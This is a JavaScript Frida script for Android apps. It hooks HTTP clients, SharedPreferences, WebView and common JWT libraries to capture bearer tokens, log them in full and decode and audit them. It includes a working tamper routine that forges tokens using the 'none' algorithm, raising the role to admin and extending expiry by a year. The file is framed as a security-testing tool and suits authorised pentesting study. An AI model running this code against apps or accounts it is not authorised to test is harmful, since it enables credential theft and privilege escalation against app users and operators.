/*
 * JWT Token Interceptor and Analyzer
 * 
 * This Frida script intercepts, analyzes, and manipulates JWT tokens in Android applications.
 * It hooks various JWT libraries and HTTP clients to capture and modify JWT tokens.
 * 
 * Features:
 * - JWT token interception from HTTP headers
 * - JWT payload decoding and analysis
 * - Token tampering and manipulation
 * - SharedPreferences JWT monitoring
 * - Multiple JWT library support
 */

console.log("[+] JWT Token Interceptor and Analyzer loaded");

Java.perform(function() {
    console.log("[+] Starting JWT interception hooks...");
    
    // Hook HTTP clients for JWT tokens
    hookOkHttpJWT();
    hookRetrofitJWT();
    hookVolleyJWT();
    hookHttpURLConnectionJWT();
    
    // Hook SharedPreferences for stored tokens
    hookSharedPreferencesJWT();
    
    // Hook JWT libraries
    hookJWTLibraries();
    
    // Hook WebView for JavaScript-based JWTs
    hookWebViewJWT();
    
    console.log("[+] JWT interception setup complete");
});

function hookOkHttpJWT() {
    console.log("[+] Setting up OkHttp JWT interception...");
    
    try {
        // Hook OkHttp Request.Builder.addHeader
        var RequestBuilder = Java.use('okhttp3.Request$Builder');
        RequestBuilder.addHeader.implementation = function(name, value) {
            
            if (name.equals("Authorization") && value.startsWith("Bearer ")) {
                console.log("\n[+] JWT Token Intercepted via OkHttp:");
                console.log("    Header: " + name);
                console.log("    Full Value: " + value);
                
                var token = value.substring(7); // Remove "Bearer "
                analyzeJWT(token, "OkHttp Request");
                
                // Optional: Tamper with token
                var tamperedToken = tamperJWTIfNeeded(token);
                if (tamperedToken !== token) {
                    console.log("[!] Token tampered - using modified version");
                    return this.addHeader(name, "Bearer " + tamperedToken);
                }
            }
            
            // Check for other JWT-like headers
            if (isJWTLikeHeader(name, value)) {
                console.log("\n[+] Potential JWT in header:");
                console.log("    Header: " + name);
                console.log("    Value: " + value);
                analyzeJWT(value, "OkHttp Custom Header");
            }
            
            return this.addHeader(name, value);
        };
        
        // Hook response headers for JWT tokens
        var Response = Java.use('okhttp3.Response');
        var originalHeaders = Response.headers.overload();
        Response.headers.overload().implementation = function() {
            var headers = originalHeaders.call(this);
            
            // Check response headers for JWTs
            var headerNames = headers.names();
            var iterator = headerNames.iterator();
            
            while (iterator.hasNext()) {
                var headerName = iterator.next();
                var headerValue = headers.get(headerName);
                
                if (headerName.toLowerCase().includes("token") || 
                    headerName.toLowerCase().includes("auth") ||
                    isJWTToken(headerValue)) {
                    
                    console.log("\n[+] JWT Token in Response Header:");
                    console.log("    Header: " + headerName);
                    console.log("    Value: " + headerValue);
                    analyzeJWT(headerValue, "OkHttp Response");
                }
            }
            
            return headers;
        };
        
        console.log("[+] OkHttp JWT hooks installed");
        
    } catch (err) {
        console.log("[-] Failed to hook OkHttp: " + err);
    }
}

function hookRetrofitJWT() {
    console.log("[+] Setting up Retrofit JWT interception...");
    
    try {
        // Hook Retrofit annotation processing
        var ParameterHandler = Java.use('retrofit2.ParameterHandler$Header');
        
        // This is a more complex hook since Retrofit uses annotation processing
        // We'll hook the HTTP client it uses (usually OkHttp)
        
        console.log("[+] Retrofit JWT hooks installed (via OkHttp)");
        
    } catch (err) {
        console.log("[-] Failed to hook Retrofit: " + err);
    }
}

function hookVolleyJWT() {
    console.log("[+] Setting up Volley JWT interception...");
    
    try {
        // Hook Volley Request
        var Request = Java.use('com.android.volley.Request');
        
        Request.getHeaders.implementation = function() {
            var headers = this.getHeaders();
            
            // Check headers for JWT tokens
            var keySet = headers.keySet();
            var iterator = keySet.iterator();
            
            while (iterator.hasNext()) {
                var key = iterator.next();
                var value = headers.get(key);
                
                if (key.equals("Authorization") && value.startsWith("Bearer ")) {
                    console.log("\n[+] JWT Token Intercepted via Volley:");
                    console.log("    Header: " + key);
                    console.log("    Value: " + value);
                    
                    var token = value.substring(7);
                    analyzeJWT(token, "Volley Request");
                }
            }
            
            return headers;
        };
        
        console.log("[+] Volley JWT hooks installed");
        
    } catch (err) {
        console.log("[-] Failed to hook Volley: " + err);
    }
}

function hookHttpURLConnectionJWT() {
    console.log("[+] Setting up HttpURLConnection JWT interception...");
    
    try {
        // Hook HttpURLConnection.setRequestProperty
        var HttpURLConnection = Java.use('java.net.HttpURLConnection');
        
        HttpURLConnection.setRequestProperty.implementation = function(key, value) {
            
            if (key.equals("Authorization") && value.startsWith("Bearer ")) {
                console.log("\n[+] JWT Token Intercepted via HttpURLConnection:");
                console.log("    Header: " + key);
                console.log("    Value: " + value);
                
                var token = value.substring(7);
                analyzeJWT(token, "HttpURLConnection");
            }
            
            return this.setRequestProperty(key, value);
        };
        
        console.log("[+] HttpURLConnection JWT hooks installed");
        
    } catch (err) {
        console.log("[-] Failed to hook HttpURLConnection: " + err);
    }
}

function hookSharedPreferencesJWT() {
    console.log("[+] Setting up SharedPreferences JWT monitoring...");
    
    try {
        var SharedPreferences = Java.use('android.content.SharedPreferences');
        
        // Hook getString to catch JWT retrieval
        SharedPreferences.getString.implementation = function(key, defValue) {
            var value = this.getString(key, defValue);
            
            if (value && (key.toLowerCase().includes('token') || 
                         key.toLowerCase().includes('jwt') || 
                         key.toLowerCase().includes('auth') ||
                         isJWTToken(value))) {
                
                console.log("\n[+] JWT Token Retrieved from SharedPreferences:");
                console.log("    Key: " + key);
                console.log("    Value: " + value);
                analyzeJWT(value, "SharedPreferences");
            }
            
            return value;
        };
        
        // Hook Editor.putString to catch JWT storage
        var Editor = Java.use('android.content.SharedPreferences$Editor');
        
        Editor.putString.implementation = function(key, value) {
            
            if (value && (key.toLowerCase().includes('token') || 
                         key.toLowerCase().includes('jwt') || 
                         key.toLowerCase().includes('auth') ||
                         isJWTToken(value))) {
                
                console.log("\n[+] JWT Token Stored in SharedPreferences:");
                console.log("    Key: " + key);
                console.log("    Value: " + value);
                analyzeJWT(value, "SharedPreferences Storage");
            }
            
            return this.putString(key, value);
        };
        
        console.log("[+] SharedPreferences JWT hooks installed");
        
    } catch (err) {
        console.log("[-] Failed to hook SharedPreferences: " + err);
    }
}

function hookJWTLibraries() {
    console.log("[+] Setting up JWT library hooks...");
    
    // Hook common JWT libraries
    hookAuth0JWT();
    hookJJWTLibrary();
    hookAndroidJWT();
    hookNimbusJOSE();
}

function hookAuth0JWT() {
    try {
        // Hook Auth0 JWT library
        var JWT = Java.use('com.auth0.jwt.JWT');
        
        JWT.decode.implementation = function(token) {
            console.log("\n[+] Auth0 JWT.decode() called:");
            console.log("    Token: " + token);
            
            var result = this.decode(token);
            analyzeJWT(token, "Auth0 JWT Library");
            
            return result;
        };
        
        console.log("[+] Auth0 JWT library hooks installed");
        
    } catch (err) {
        console.log("[-] Auth0 JWT library not found: " + err);
    }
}

function hookJJWTLibrary() {
    try {
        // Hook JJWT library
        var Jwts = Java.use('io.jsonwebtoken.Jwts');
        
        Jwts.parser.implementation = function() {
            console.log("[+] JJWT Jwts.parser() called");
            return this.parser();
        };
        
        console.log("[+] JJWT library hooks installed");
        
    } catch (err) {
        console.log("[-] JJWT library not found: " + err);
    }
}

function hookAndroidJWT() {
    try {
        // Hook Android JWT library
        var JWTCreator = Java.use('com.auth0.jwt.JWTCreator');
        
        console.log("[+] Android JWT library hooks installed");
        
    } catch (err) {
        console.log("[-] Android JWT library not found: " + err);
    }
}

function hookNimbusJOSE() {
    try {
        // Hook Nimbus JOSE library
        var JWSObject = Java.use('com.nimbusds.jose.JWSObject');
        
        JWSObject.parse.implementation = function(s) {
            console.log("\n[+] Nimbus JWSObject.parse() called:");
            console.log("    Token: " + s);
            
            var result = this.parse(s);
            analyzeJWT(s, "Nimbus JOSE Library");
            
            return result;
        };
        
        console.log("[+] Nimbus JOSE library hooks installed");
        
    } catch (err) {
        console.log("[-] Nimbus JOSE library not found: " + err);
    }
}

function hookWebViewJWT() {
    console.log("[+] Setting up WebView JWT interception...");
    
    try {
        var WebView = Java.use('android.webkit.WebView');
        
        // Hook evaluateJavascript to catch JWT operations
        WebView.evaluateJavascript.implementation = function(script, resultCallback) {
            
            if (script.toLowerCase().includes('jwt') || 
                script.toLowerCase().includes('token') ||
                script.toLowerCase().includes('bearer')) {
                
                console.log("\n[+] WebView JavaScript with JWT detected:");
                console.log("    Script: " + script.substring(0, 200) + "...");
                
                // Look for JWT patterns in the script
                var jwtMatches = script.match(/eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*/g);
                if (jwtMatches) {
                    jwtMatches.forEach(function(token) {
                        console.log("[+] JWT found in WebView script:");
                        analyzeJWT(token, "WebView JavaScript");
                    });
                }
            }
            
            return this.evaluateJavascript(script, resultCallback);
        };
        
        console.log("[+] WebView JWT hooks installed");
        
    } catch (err) {
        console.log("[-] Failed to hook WebView: " + err);
    }
}

function isJWTToken(value) {
    if (!value || typeof value !== 'string') {
        return false;
    }
    
    // JWT token pattern: header.payload.signature
    var jwtPattern = /^eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*$/;
    return jwtPattern.test(value);
}

function isJWTLikeHeader(name, value) {
    if (!name || !value) return false;
    
    var nameLower = name.toLowerCase();
    var suspiciousHeaders = ['x-auth-token', 'x-access-token', 'x-jwt-token', 'token'];
    
    return suspiciousHeaders.includes(nameLower) && isJWTToken(value);
}

function analyzeJWT(token, source) {
    if (!isJWTToken(token)) {
        console.log("[-] Invalid JWT format");
        return;
    }
    
    try {
        console.log("\n=== JWT Analysis ===");
        console.log("Source: " + source);
        console.log("Full Token: " + token);
        
        var parts = token.split('.');
        if (parts.length < 2) {
            console.log("[-] Invalid JWT structure");
            return;
        }
        
        // Decode header
        var header = decodeJWTPart(parts[0]);
        console.log("\nHeader:");
        console.log(JSON.stringify(header, null, 2));
        
        // Decode payload
        var payload = decodeJWTPart(parts[1]);
        console.log("\nPayload:");
        console.log(JSON.stringify(payload, null, 2));
        
        // Analyze token security
        analyzeJWTSecurity(header, payload, token);
        
        // Check signature
        if (parts.length === 3 && parts[2]) {
            console.log("\nSignature: " + parts[2]);
        } else {
            console.log("\n[!] WARNING: No signature found!");
        }
        
        console.log("===================\n");
        
    } catch (err) {
        console.log("[-] Failed to analyze JWT: " + err);
    }
}

function decodeJWTPart(part) {
    // Add padding if needed
    var padded = part + '='.repeat((4 - part.length % 4) % 4);
    
    // Replace URL-safe characters
    padded = padded.replace(/-/g, '+').replace(/_/g, '/');
    
    try {
        // Use Java's Base64 decoder
        var Base64 = Java.use('android.util.Base64');
        var decoded = Base64.decode(padded, Base64.DEFAULT.value);
        var String = Java.use('java.lang.String');
        var jsonString = String.$new(decoded);
        
        return JSON.parse(jsonString);
    } catch (err) {
        console.log("[-] Failed to decode JWT part: " + err);
        return {};
    }
}

function analyzeJWTSecurity(header, payload, token) {
    console.log("\n--- Security Analysis ---");
    
    // Check algorithm
    var alg = header.alg;
    if (alg === 'none') {
        console.log("[!] CRITICAL: Algorithm is 'none' - signature verification bypassed!");
    } else if (alg && alg.startsWith('HS')) {
        console.log("[!] HMAC algorithm detected (" + alg + ") - may be vulnerable to brute force");
    } else if (alg && alg.startsWith('RS')) {
        console.log("[+] RSA algorithm (" + alg + ") - generally secure if properly implemented");
    }
    
    // Check expiration
    if (payload.exp) {
        var expDate = new Date(payload.exp * 1000);
        var now = new Date();
        
        console.log("Expires: " + expDate.toISOString());
        
        if (now > expDate) {
            console.log("[!] WARNING: Token is EXPIRED");
        } else {
            var timeLeft = Math.floor((expDate - now) / 1000 / 60);
            console.log("[+] Token valid for " + timeLeft + " more minutes");
        }
    } else {
        console.log("[!] WARNING: No expiration time set");
    }
    
    // Check for sensitive data in payload
    var sensitiveFields = ['password', 'secret', 'key', 'ssn', 'credit_card'];
    for (var field in payload) {
        if (sensitiveFields.some(sensitive => field.toLowerCase().includes(sensitive))) {
            console.log("[!] WARNING: Sensitive field '" + field + "' found in payload");
        }
    }
    
    // Check for admin/elevated privileges
    if (payload.role && (payload.role === 'admin' || payload.role === 'administrator')) {
        console.log("[!] NOTICE: Admin role detected");
    }
    
    if (payload.permissions && Array.isArray(payload.permissions)) {
        console.log("[+] Permissions: " + payload.permissions.join(', '));
    }
}

function tamperJWTIfNeeded(token) {
    // This function can be customized to tamper with JWTs
    // Example: Change user role to admin
    
    if (!shouldTamperToken(token)) {
        return token;
    }
    
    try {
        var parts = token.split('.');
        var payload = decodeJWTPart(parts[1]);
        
        // Example tampering: Change role to admin
        if (payload.role && payload.role !== 'admin') {
            console.log("[!] Tampering: Changing role from '" + payload.role + "' to 'admin'");
            payload.role = 'admin';
        }
        
        // Example tampering: Extend expiration
        if (payload.exp) {
            var newExp = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60); // +1 year
            console.log("[!] Tampering: Extending expiration time");
            payload.exp = newExp;
        }
        
        // Re-encode payload
        var newPayload = btoa(JSON.stringify(payload))
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=/g, '');
        
        // Create tampered token (without signature for 'none' algorithm)
        var tamperedToken = parts[0] + '.' + newPayload + '.';
        
        return tamperedToken;
        
    } catch (err) {
        console.log("[-] Failed to tamper with JWT: " + err);
        return token;
    }
}

function shouldTamperToken(token) {
    // Add logic to determine when to tamper with tokens
    // For example, only tamper in test environments
    
    try {
        var parts = token.split('.');
        var header = decodeJWTPart(parts[0]);
        
        // Only tamper if algorithm is 'none' (no signature verification)
        return header.alg === 'none';
        
    } catch (err) {
        return false;
    }
}

// Helper functions
function btoa(str) {
    try {
        var Base64 = Java.use('android.util.Base64');
        var bytes = Java.use('java.lang.String').$new(str).getBytes();
        var encoded = Base64.encodeToString(bytes, Base64.NO_WRAP.value);
        return encoded;
    } catch (err) {
        return str;
    }
}

console.log("[+] JWT Token Interceptor ready");
console.log("[+] Monitoring all HTTP requests for JWT tokens");
console.log("[+] Check console output for JWT analysis results");

/*
 * Usage Instructions:
 * 
 * 1. Save this script as jwt_hook.js
 * 2. Run with Frida: frida -U -l jwt_hook.js [package_name]
 * 3. Use the application and make requests that include JWT tokens
 * 4. Monitor console output for JWT interception and analysis
 * 5. Modify tamperJWTIfNeeded() function to customize token manipulation
 * 
 * Features:
 * - Automatically intercepts JWT tokens from HTTP headers
 * - Decodes and analyzes JWT structure and security
 * - Monitors SharedPreferences for stored tokens
 * - Supports multiple HTTP clients (OkHttp, Volley, etc.)
 * - Can tamper with tokens for testing purposes
 * 
 * Security Checks:
 * - Algorithm verification (detects 'none' algorithm vulnerability)
 * - Expiration time validation
 * - Sensitive data exposure in payload
 * - Role and permission analysis
 */
